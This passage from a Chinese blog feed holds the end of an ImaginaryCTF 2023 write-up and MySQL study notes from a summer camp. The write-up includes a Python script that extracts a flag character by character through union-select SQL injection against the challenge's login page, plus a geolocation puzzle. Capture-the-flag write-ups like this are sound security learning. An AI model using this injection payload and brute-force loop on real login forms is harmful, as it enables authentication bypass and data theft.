class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">#echo $res;</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>有点小慢，问chatgpt知道python里是有一个bcrypy库的，于是再写了个python脚本，写完之后发现其实速度大差不差</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> bcrypt<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>pre = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?1234567890&#125;&#123;_&quot;</span><br><span class="hljs-keyword">for</span> re <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">71</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pre:<br>        <span class="hljs-comment">#print(flag)</span><br>        password = <span class="hljs-string">&quot;a&quot;</span> * re<br>        username = <span class="hljs-string">&quot;a&quot;</span> * re + flag + i<br><br>        hashed_password = bcrypt.hashpw(username.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), bcrypt.gensalt())<br>        post_data = &#123;<br>            <span class="hljs-string">&#x27;password&#x27;</span>: password,<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;\&#x27; union select \&#x27;admin\&#x27;,\&#x27;&#x27;</span> + hashed_password.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">&#x27;\&#x27;--&#x27;</span><br>        &#125;<br>        <span class="hljs-comment">#print(&quot;username:&quot;+username+&quot;\n&quot;)</span><br>        <span class="hljs-comment">#print(post_data)</span><br>        url = <span class="hljs-string">&#x27;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&#x27;</span><br><br>        response = requests.post(url, data=post_data)<br>        res = response.text<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Welcome&#x27;</span> <span class="hljs-keyword">in</span> res:<br>            flag += i<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>超酷的好吗</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724022049089.png"></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Signpost"><a href="#Signpost" class="headerlink" title="Signpost"></a>Signpost</h3><p>一道社工题，给了个路标，找经纬度，大致能看清图片上信息：</p><ol><li>距SCOTTSDALE STADIUM 761英里</li><li>距离POLO(?)GROUNDS 2925英里</li><li>距SEALS STADIUM2英里</li></ol><p><img src="/2023/07/23/imaginary-ctf/signpost.png"></p><p>本来，按理来说是要分别找到这三个已知点的经纬度，根据距离画三个圆，三个圆的交点便是目标点附近，但是。。</p><p>根据题目描述，这个地方是在一个ball park主题公园，当时我在快乐搜索这三个已知点的时候</p><p><img src="/2023/07/23/imaginary-ctf/seals.jpg"></p><p>直觉告诉我这就是题目要的ballpark，Google Earth，启动！！</p><p>emmmm，我不管！！肯定就是Oracle Park！！</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724165912622.png"></p><p>获取经纬度</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724165959400.png"></p><p>联想到社工误差较大，给了一定的容错空间</p><p>但是就在附近的话经纬度变化不会太大</p><p>377.779±0.03,-122.389±0.03</p><p>试了十几次试出来了</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROIS_Summer</title>
    <link href="/2023/07/09/ROIS-Summer/"/>
    <url>/2023/07/09/ROIS-Summer/</url>
    
    <content type="html"><![CDATA[<h1 id="ROIS夏令营"><a href="#ROIS夏令营" class="headerlink" title="ROIS夏令营"></a>ROIS夏令营</h1><hr><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="MySQL学习记录"><a href="#MySQL学习记录" class="headerlink" title="MySQL学习记录"></a>MySQL学习记录</h3><h4 id="7-9"><a href="#7-9" class="headerlink" title="7.9"></a>7.9</h4><p>配置环境参考<a href="https://potatowo233.github.io/2023/04/05/docker-note/#Docker-%E9%83%A8%E7%BD%B2-MySQL">docker-note中文章</a></p><p>默认在3306端口运行MySQL服务。</p><p>数据库管理系统：</p><p>用来管理数据库中数据的，对数据增删查改。常见：<code>MySQL、DB2、Oracle</code>等。</p><p><strong>执行MySQL命令时注意以分号结尾，不见分号不执行</strong></p><p><strong>SQL语句不区分大小写</strong></p><p>常用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show databases;#查看有哪些数据库<br>use &lt;DB&gt;;#使用某个数据库(自带4个数据库，SQLI注入时与其中某些息息相关，存有数据库表名等等信息)<br>create database &lt;DB&gt;;#创建数据库<br>exit;#退出<br>show tables;#查看某个数据库内的表<br></code></pre></td></tr></table></figure><p>表(<strong>table</strong>)：</p><p>行(row)</p><p>列(字段)(<strong>column</strong>)</p><p>SQL语句：</p><p>DQL：数据查询语言(带SELECT)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT &lt;字段名&gt; FROM &lt;表名&gt;#如果查询多个字段字段间用逗号隔开，查询全部用*或者一个一个字段敲进去，星号效率低，实际开发不建议使用<br>SELECT &lt;字段1&gt;,&lt;字段2&gt;,&lt;字段3&gt;... FROM &lt;表名&gt; WHERE &lt;条件&gt;;#条件中&gt;、&lt;、&gt;=、&lt;=、=不用赘述，between .. and ..介于两者之间(左小右大)、&lt;&gt;或!=不等于、or 或、and 与<br>#同大多数编程语言一样，and优先级高于or，最好用括号明确逻辑层次<br>SELECT<br>...<br>FROM<br>...<br>WHERE<br>...<br>GROUP BY<br>...<br>ORDER  BY<br>...;#关键字顺序不能错<br></code></pre></td></tr></table></figure><p>DML：数据操作语言(对表当中数据增删改)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT#增<br>DELETE#删<br>UPDATE#改<br></code></pre></td></tr></table></figure><p>DDL：数据定义语言(CREATE、DROP、ALTER，主要操作表结构而不是修改数据，如删掉某列，增加新的一个字段、创建、删除表)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE#新建<br>ALTER#修改<br>DROP#删除<br>#不同于DML对表数据的增删改，DDL是对表结构进行操作<br></code></pre></td></tr></table></figure><p>TCL：事务控制语言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">COMMIT#事务提交<br>ROLLBACK#事务回滚<br></code></pre></td></tr></table></figure><p>DCL：数据控制语言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg:<br>GRAND#授权<br>REVOKE#撤销权限<br></code></pre></td></tr></table></figure><p>下面用上面学到操作的先制作一个测试用数据库练练手</p><p>先看一下有哪些数据库 <code>show databases;</code>，之前复现题目环境时创建了个flag数据库，正好可以试下删除数据库的操作</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709150139318.png"></p><p><code>use flag;</code>进入该数据库，<code>show tables;</code>查看数据库内所有表</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709150816476.png"></p><p>浅查一下</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709150912146.png"></p><p>查完，删表跑路（bushi</p><p>可以看到我们的test数据库内只有一个flag表，下面删除该表<code>drop table flag;</code></p><p><img src="/2023/07/09/ROIS-Summer/image-20230709151149295.png"></p><p>使用<code>drop table &lt;表名&gt;;</code>删表，这时候我们再查数据库中的表名，已经是空的了，那一不做二不休，试一下删数据库<code>drop database flag;</code></p><p><img src="/2023/07/09/ROIS-Summer/image-20230709152945576.png"></p><p>可以看到flag数据库已经被删除了。</p><p>这里先开navicat可视化快速创个数据库然后导出，一会尝试从文件导入</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709153841466.png"></p><p>导入文件的时候踩了个坑(其实还有个坑，这个坑也是几乎所有编程语言共有的，养成良好习惯从我做起（，路径中憋整中文)</p><p>使用命令<code>source &lt;file_url&gt;;</code>导入sql文件(意外发现其实source命令也可以不需要分号，但是养成好习惯，都加)</p><p>要先选中一个数据库再导入</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709160434502.png"></p><p>如图所示便导入成功：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709161124060.png"></p><p>查看表结构，不看数据，使用<code>describe &lt;表名&gt;;</code>命令(或者<code>desc &lt;表名&gt;</code>也可)</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709162429614.png"></p><p>然后感觉自己创的表太草率了，找了个更好的数据库导入了（</p><p>下面进行desc查表结构以及使用as关键字对查询字段起别名(注意as只对一个字段生效)(as可省，但是注意别名和真名间不要有逗号)：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709172305350.png"></p><p><strong>起别名不对原表字段名造成影响</strong></p><p><strong>SELECT语句永远无法进行修改操作</strong></p><p><strong>在所有数据库中，字符串是用单引号括起来的，双引号在Oracle中无法使用但是在MySQL中可以，例别名中有空格别名用单引号括起来</strong></p><p>字段可以使用数学表达式：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709180029404.png"></p><p><img src="/2023/07/09/ROIS-Summer/image-20230709180041731.png"></p><h4 id="7-10"><a href="#7-10" class="headerlink" title="7.10"></a>7.10</h4><p> MySQL中NULL不能用&#x3D;衡量，只能用<code>is/is not</code>，因为数据库中的NULL是表示该位置为空，而不是一个值，是一个属性</p><p><img src="/2023/07/09/ROIS-Summer/image-20230710141543103.png"></p><p>IN关键字(等价于多个or)，取反用not in()：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230710143250340.png"></p><p>like(模糊查询，sql注入会使用到)：</p><ul><li>‘%’匹配任意个字符（可理解为正则表达式<code>.*?</code>）；</li><li>‘_’一个下划线只匹配一个字符（可以理解为正则表达式的<code>.</code>）；</li></ul><p>eg：</p><p>查询名字里含有字符’o’的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;%o%&#x27;;<br></code></pre></td></tr></table></figure><p>OUTPUT:</p><p><img src="/2023/07/09/ROIS-Summer/image-20230710144012932.png"></p><p>eg：</p><p>以T结尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;%T&#x27;;<br></code></pre></td></tr></table></figure><p>以K开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;K%&#x27;;<br></code></pre></td></tr></table></figure><p>找出第二个字母是A的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;_A%&#x27;;<br></code></pre></td></tr></table></figure><p>找出含下划线的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;%\_%&#x27;;#使用转义字符&#x27;\&#x27;<br></code></pre></td></tr></table></figure><p>order by排序：</p><p><code>order by sal</code>默认升序，指定降序<code>order by sal desc</code>(descend)，指定升序<code>order by sal asc</code>(ascend)</p><p>多字段排序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询员工名字和薪资，要求按照薪资升序，薪资相同按照名字升序<br>select ename,sal from emp order by sal asc,ename asc;#sal在前起主导，sal相等时才比较ename<br></code></pre></td></tr></table></figure><p>根据字段位置排序(sql注入常用)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal from emp order by 2;#2表示第二列<br></code></pre></td></tr></table></figure><p><strong>数据处理函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Lower()#转换小写<br>Upper()#转换大写<br>******Substr()#取子串(sub(string,start,length))<br>******Length()#取长度<br>Trim()#去空格<br>str_to_date()#将字符串转化成日期<br>data_format()#格式化日期<br>format()#设置千分位<br>round()#四舍五入，用法：round(待变值，保留小数位)<br>rand()#生成随机数<br>******concat()#字符串拼接，而不能用加号<br>ifnull()#将null赋予值，ifnull(数据，被当做哪个值)，如果数据是null,将数据当做哪个值<br></code></pre></td></tr></table></figure><p><em><strong>substr()起始下标从1开始而不是0！</strong></em></p><p>找出员工名字第一个字母是A的员工信息？</p><p>两种方法：</p><ol><li><code>select ename from emp where ename like &#39;A%&#39;;</code></li><li><code>select ename from emp where substr(ename,1,1)=&#39;A&#39;;</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql"> select ename,sal + comm as salcomm from emp;#数据库中有null参与的数据运算结果都为null<br>+--------+---------+<br>| ename  | salcomm |<br>+--------+---------+<br>| SMITH  |    NULL |<br>| ALLEN  | 1900.00 |<br>| WARD   | 1750.00 |<br>| JONES  |    NULL |<br>| MARTIN | 2650.00 |<br>| BLAKE  |    NULL |<br>| CLARK  |    NULL |<br>| SCOTT  |    NULL |<br>| KING   |    NULL |<br>| TURNER | 1500.00 |<br>| ADAMS  |    NULL |<br>| JAMES  |    NULL |<br>| FORD   |    NULL |<br>| MILLER |    NULL |<br>+--------+---------+<br></code></pre></td></tr></table></figure><p>ifnull()的用途：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal + ifnull(comm,0) as salcomm from emp;<br>+--------+---------+<br>| ename  | salcomm |<br>+--------+---------+<br>| SMITH  |  800.00 |<br>| ALLEN  | 1900.00 |<br>| WARD   | 1750.00 |<br>| JONES  | 2975.00 |<br>| MARTIN | 2650.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| SCOTT  | 3000.00 |<br>| KING   | 5000.00 |<br>| TURNER | 1500.00 |<br>| ADAMS  | 1100.00 |<br>| JAMES  |  950.00 |<br>| FORD   | 3000.00 |<br>| MILLER | 1300.00 |<br>+--------+---------+<br></code></pre></td></tr></table></figure><p><code>case...when...then...when...then...else...end</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg:当员工工作岗位是MANAGER时工资上调10%，当员工工作岗位是SALESMAN时工资上调15%，其他正常<br> select ename,job,sal as oldsal,(case job when &#x27;MANAGER&#x27; then sal*1.1 when &#x27;SALESMAN&#x27; then sal*1.5 else sal end) as newsal from emp;<br>+--------+-----------+---------+---------+<br>| ename  | job       | oldsal  | newsal  |<br>+--------+-----------+---------+---------+<br>| SMITH  | CLERK     |  800.00 |  800.00 |<br>| ALLEN  | SALESMAN  | 1600.00 | 2400.00 |<br>| WARD   | SALESMAN  | 1250.00 | 1875.00 |<br>| JONES  | MANAGER   | 2975.00 | 3272.50 |<br>| MARTIN | SALESMAN  | 1250.00 | 1875.00 |<br>| BLAKE  | MANAGER   | 2850.00 | 3135.00 |<br>| CLARK  | MANAGER   | 2450.00 | 2695.00 |<br>| SCOTT  | ANALYST   | 3000.00 | 3000.00 |<br>| KING   | PRESIDENT | 5000.00 | 5000.00 |<br>| TURNER | SALESMAN  | 1500.00 | 2250.00 |<br>| ADAMS  | CLERK     | 1100.00 | 1100.00 |<br>| JAMES  | CLERK     |  950.00 |  950.00 |<br>| FORD   | ANALYST   | 3000.00 | 3000.00 |<br>| MILLER | CLERK     | 1300.00 | 1300.00 |<br>+--------+-----------+---------+---------+<br></code></pre></td></tr></table></figure><h4 id="7-11"><a href="#7-11" class="headerlink" title="7.11"></a>7.11</h4><p> <strong>分组函数：</strong></p><p>输入多行，输出一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">count()#计数，count(*)表示统计所有行数，count(具体字段)代表统计该字段下不为null的<br>sum()#求和<br>avg()#平均值<br>max()#最大值<br>min()#最小值<br></code></pre></td></tr></table></figure><p>分组函数自动忽略null，不需要对null进行处理</p><p>分组函数在使用时必须分组，没分组默认整张表是一组</p><p>分组函数不能直接使用在where语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal from emp where sal &gt; min(sal);#表面上没问题<br>ERROR 1111 (HY000): Invalid use of group function<br>#实际报错，无效使用分组函数<br>#为什么？分组查询(group by)<br>#分组函数在使用时必须先分组，但是WHERE语句在执行时排在GROUP BY后面，此时还没分组<br>#为什么select sum(sal) from emp;不用分组也能用呢？<br>#因为执行顺序<br>#from,where,group by,select,order by，select在group by之后执行<br></code></pre></td></tr></table></figure><p><strong>分组查询：(SQL注入常用)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#找出每个工作岗位的工资和？<br>#思路：按工作岗位分组，对工资求和<br>select job,sum(sal) from emp group by job;<br>+-----------+----------+<br>| job       | sum(sal) |<br>+-----------+----------+<br>| ANALYST   |  6000.00 |<br>| CLERK     |  4150.00 |<br>| MANAGER   |  8275.00 |<br>| PRESIDENT |  5000.00 |<br>| SALESMAN  |  5600.00 |<br>+-----------+----------+<br></code></pre></td></tr></table></figure><p>在一条SELECT语句中如果有GROUP BY，SELECT后面只能跟参加分组的字段和分组函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal,deptno from emp;#先查一下表，可以看到10部门中最高工资是KING，20部门中最高工资是FORD和SCOTT，30部门中最高工资是BLAKE<br>+--------+---------+--------+<br>| ename  | sal     | deptno |<br>+--------+---------+--------+<br>| SMITH  |  800.00 |     20 |<br>| ALLEN  | 1600.00 |     30 |<br>| WARD   | 1250.00 |     30 |<br>| JONES  | 2975.00 |     20 |<br>| MARTIN | 1250.00 |     30 |<br>| BLAKE  | 2850.00 |     30 |<br>| CLARK  | 2450.00 |     10 |<br>| SCOTT  | 3000.00 |     20 |<br>| KING   | 5000.00 |     10 |<br>| TURNER | 1500.00 |     30 |<br>| ADAMS  | 1100.00 |     20 |<br>| JAMES  |  950.00 |     30 |<br>| FORD   | 3000.00 |     20 |<br>| MILLER | 1300.00 |     10 |<br>+--------+---------+--------+<br>select deptno,max(sal) from emp group by deptno;#查一下每个部门的最高工资<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>|     30 |  2850.00 |<br>+--------+----------+<br>select ename,deptno,max(sal) from emp group by deptno;#select后加上ename<br>+-------+--------+----------+<br>| ename | deptno | max(sal) |<br>+-------+--------+----------+<br>| CLARK |     10 |  5000.00 |<br>| SMITH |     20 |  3000.00 |<br>| ALLEN |     30 |  2850.00 |<br>+-------+--------+----------+<br>#结果可以看到ename和后面的工资部门信息并不对应，ename无意义，并且Oracle中会报错<br>#如果想实现输出预期结果，需要用到表连接<br></code></pre></td></tr></table></figure><p>按多个字段联合分组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#找出每个部门，不同工作岗位的最高薪资<br>select ename,job,sal,deptno from emp order by deptno;#先查询下按部门分组情况，为便于分析，按部门排序<br>+--------+-----------+---------+--------+<br>| ename  | job       | sal     | deptno |<br>+--------+-----------+---------+--------+<br>| MILLER | CLERK     | 1300.00 |     10 |<br>| KING   | PRESIDENT | 5000.00 |     10 |<br>| CLARK  | MANAGER   | 2450.00 |     10 |<br><br><br>| FORD   | ANALYST   | 3000.00 |     20 |<br>| ADAMS  | CLERK     | 1100.00 |     20 |<br>| SCOTT  | ANALYST   | 3000.00 |     20 |<br>| JONES  | MANAGER   | 2975.00 |     20 |<br>| SMITH  | CLERK     |  800.00 |     20 |<br><br><br>| BLAKE  | MANAGER   | 2850.00 |     30 |<br>| MARTIN | SALESMAN  | 1250.00 |     30 |<br>| TURNER | SALESMAN  | 1500.00 |     30 |<br>| WARD   | SALESMAN  | 1250.00 |     30 |<br>| JAMES  | CLERK     |  950.00 |     30 |<br>| ALLEN  | SALESMAN  | 1600.00 |     30 |<br>+--------+-----------+---------+--------+<br><br>select deptno,job,max(sal) from emp group by deptno,job;#联合分组查询<br>+--------+-----------+----------+<br>| deptno | job       | max(sal) |<br>+--------+-----------+----------+<br>|     10 | CLERK     |  1300.00 |<br>|     10 | MANAGER   |  2450.00 |<br>|     10 | PRESIDENT |  5000.00 |<br>|     20 | ANALYST   |  3000.00 |<br>|     20 | CLERK     |  1100.00 |<br>|     20 | MANAGER   |  2975.00 |<br>|     30 | CLERK     |   950.00 |<br>|     30 | MANAGER   |  2850.00 |<br>|     30 | SALESMAN  |  1600.00 |<br>+--------+-----------+----------+<br></code></pre></td></tr></table></figure><p>如果想对分完组之后的数据进一步过滤，不要用WHERE(参考上面的内容)，而应该用HAVING子句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg：找出每个部门最高薪资，要求显示最高薪资大于3000的<br>select deptno,max(sal) from emp group by deptno;#先不考虑要求，查最大薪资<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>|     30 |  2850.00 |<br>+--------+----------+<br>select deptno,max(sal) from emp group by deptno having max(sal)&gt;3000;#考虑限制要求<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>+--------+----------+<br>#只有5000被留下来了<br>#having语句要和group by配套使用，不能代替where<br></code></pre></td></tr></table></figure><p>但是上述语句效率相对比较较低，实际上可以这样考虑：</p><p>先将薪资大于3000的用WHERE过滤了，不大于3000的就不进行分组了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select deptno,max(sal) from emp where sal &gt; 3000 group by deptno;<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>+--------+----------+<br></code></pre></td></tr></table></figure><p>where和having优先选择where，where没办法的再选择having(比如对每个部门平均薪资进行限制的)</p><p><code>distinct</code>关键字：</p><p>把查询结果去除重复记录，注：原表数据不会被修改，只是查询结果去重</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select job from emp;<br>+-----------+<br>| job       |<br>+-----------+<br>| CLERK     |<br>| SALESMAN  |<br>| SALESMAN  |<br>| MANAGER   |<br>| SALESMAN  |<br>| MANAGER   |<br>| MANAGER   |<br>| ANALYST   |<br>| PRESIDENT |<br>| SALESMAN  |<br>| CLERK     |<br>| CLERK     |<br>| ANALYST   |<br>| CLERK     |<br>+-----------+<br>select distinct job from emp;#去重<br>+-----------+<br>| job       |<br>+-----------+<br>| CLERK     |<br>| SALESMAN  |<br>| MANAGER   |<br>| ANALYST   |<br>| PRESIDENT 